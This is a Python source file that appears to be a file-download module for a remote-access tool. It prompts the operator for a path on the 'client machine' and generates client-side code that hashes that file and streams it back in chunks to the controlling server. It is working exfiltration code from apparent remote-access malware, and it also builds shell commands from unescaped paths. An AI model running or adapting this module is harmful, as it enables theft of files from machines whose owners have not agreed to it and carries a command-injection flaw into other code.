import os


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Download a file from the client.",
            "References": []
        }
        self.download_file = None
        self.output_folder = None
        self.buffer_size = None

    def setup(self, module_view, output_view, successful):
        self.download_file = module_view.prompt("Path to file on client machine: ")
        self.output_folder = os.path.expanduser(module_view.prompt("Local output folder (ENTER for output/): "))
        self.buffer_size = module_view.prompt("Buffer size (ENTER for 4096 bytes): ")

        # Set default variables.
        if not self.buffer_size:
            self.buffer_size = 4096
        if type(self.buffer_size) is not int:
            output_view.add("Invalid buffer size, using 4096.", "info")
            self.buffer_size = 4096
        if not self.output_folder:
            self.output_folder = "output"

            if not os.path.exists("output"):
                os.mkdir("output")

        if os.path.exists(self.output_folder + "/" + os.path.basename(self.download_file)):
            output_view.add("A file with that name already exists!", "attention")
            successful.put(False)
        elif not os.path.exists(self.output_folder):
            output_view.add("Output folder doesn't exist!", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        download_file = os.path.expanduser("%s")
        
        
        def get_file_hash():
            return run_command("md5 " + os.path.realpath(download_file)).split(" = ")[1]
        
        
        if not os.path.exists(download_file):
            print "Failed to download file: invalid file path."
        else:
            send_response("Started:" + get_file_hash(), "download")
        
            # Send back the file in pieces to the server (so we support very large files).
            with open(download_file, "rb") as input_file:
                while True:
                    piece = input_file.read(%s)
                    
                    if not piece:
                        break
                    send_response(piece, "download")
            send_response("Finished.", "download")
        """ % (self.download_file, self.buffer_size)

    def process_response(self, output_view, response):
        # Files are sent back to us in small pieces (encoded with Base64),
        # we simply decode these pieces and write them to the output file.

        output_name = os.path.basename(self.download_file)
        output_file = self.output_folder + "/" + output_name

        if "Failed to download" in response:
            output_view.add(response, "attention")
        if "Started" in response:
            output_view.add("Started file download of \"%s\"..." % output_name)
            output_view.add("Remote MD5 file hash: %s" % response.split(":")[1])
        elif "Finished" in response:
            output_view.add("Local MD5 file hash (should match): %s" % self.get_file_hash(output_file))
            output_view.add("Finished file download, saved to: %s" % output_file)
        else:
            with open(output_file, "a") as output_file:
                output_file.write(response)

    def get_file_hash(self, file_path):
        return os.popen("md5sum " + os.path.realpath(file_path)).readline().split(" ")[0]
